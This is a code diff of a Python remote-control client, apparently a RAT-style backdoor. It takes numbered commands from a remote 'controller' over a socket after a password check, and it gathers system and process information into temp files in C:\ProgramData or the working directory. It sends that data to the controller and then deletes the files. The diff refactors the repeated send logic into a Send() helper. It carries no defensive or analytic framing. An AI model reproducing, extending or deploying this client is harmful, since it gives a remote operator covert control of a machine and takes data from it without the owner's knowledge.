@@ -52,6 +52,13 @@ def PassCheck(sock):
             sock.send(b'NoAccess')
             return False
 
+# 发送数据（发送时候分数据主体和结束符End，中间睡0.1是为了分包,主控端需要单独的一个包判断发送结束，我也不知道为啥不睡就会导致两句代码发送一个包，明明之前就ok，心态炸了）
+def Send(data,sock):
+    data = data.encode('utf-8')
+    sock.send(data)
+    time.sleep(0.1)
+    sock.send(b'End')
+
 # 获取系统信息
 def Getinfo(sock):
     if SYS == 'nt':
@@ -60,10 +67,7 @@ def Getinfo(sock):
         f = open('C:\\ProgramData\\info.txt','r')
         data = f.read()
         f.close()
-        data = data.encode('utf-8')
-        sock.send(data)
-        time.sleep(0.1)
-        sock.send(b'End')
+        Send(data,sock)
         os.system('del /f /q C:\\ProgramData\\info.txt')
         return
     else:
@@ -72,10 +76,7 @@ def Getinfo(sock):
         f = open('info.txt','r')
         data = f.read()
         f.close()
-        data = data.encode('utf-8')
-        sock.send(data)
-        time.sleep(0.1)
-        sock.send(b'End')
+        Send(data,sock)
         os.system('rm -f info.txt')
         return
 
@@ -90,10 +91,7 @@ def GetMoreinfo(sock,target):
     f = open('info.txt','r')
     data = f.read()
     f.close()
-    data = data.encode('utf-8')
-    sock.send(data)
-    time.sleep(0.1)
-    sock.send(b'End')
+    Send(data,sock)
     os.system('rm -f info.txt')
 
 # 进程信息
@@ -103,10 +101,7 @@ def Process(sock):
         f = open('C:\\ProgramData\\info.txt','r')
         data = f.read()
         f.close()
-        data = data.encode('utf-8')
-        sock.send(data)
-        time.sleep(0.1)
-        sock.send(b'End')
+        Send(data,sock)
         os.system('del /f /q C:\\ProgramData\\info.txt')
         return
     else:
@@ -114,10 +109,7 @@ def Process(sock):
         f = open('info.txt','r')
         data = f.read()
         f.close()
-        data = data.encode('utf-8')
-        sock.send(data)
-        time.sleep(0.1)
-        sock.send(b'End')
+        Send(data,sock)
         os.system('rm -f info.txt')
         return
 
@@ -148,9 +140,10 @@ if ACTIVE == 0:
     s = Passive()
 else:
     s = Active()
+#系统判断的核心，只能判断win/linux，并且判断不出MacOS，后面命令都是按Linux写的，所以不支持Macos
 SYS = os.name
+#循环接受命令，一级指令为数字，二级为*（一级）x*（二级）
 while True:
-    # 每次最多接收1k字节:
     d = s.recv(1024)
     if d == b'0':
         s.send(b'Bye')
